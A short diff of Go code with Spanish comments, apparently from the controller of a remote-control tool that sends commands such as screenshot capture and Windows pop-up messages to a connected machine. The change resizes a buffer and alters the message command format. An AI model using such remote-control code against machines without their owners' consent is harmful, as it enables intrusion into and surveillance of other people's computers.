@@ -24,8 +24,8 @@ const INSTRUCCION = `
 //[ss] capturar pantalla  //
 `
 const (
-	TIMEOUT = 10    // tiempo en segundos que espera el cliente para recibir un paquete
-	BUFFER  = 20000 //tamaño del buffer de funcion envio
+	TIMEOUT = 10   // tiempo en segundos que espera el cliente para recibir un paquete
+	BUFFER  = 1024 //tamaño del buffer de funcion envio
 )
 
 // funcion que abstrae el envio de paquetes al host
@@ -96,8 +96,8 @@ func Comando(conexiones net.Conn) error {
 	case "2": // automatizacion de msg para ciertas ediciones de windows
 
 		mensaje := input.Input("mensaje >> ")
-		msg_format := fmt.Sprintf("msg * %s", mensaje)
-		envio(conexiones, msg_format)
+
+		envio(conexiones, fmt.Sprintf("msn-%s", mensaje))
 
 	case "q":
 		fmt.Println(color.Verde + "\n[!] saliendo...\n" + color.Reset)
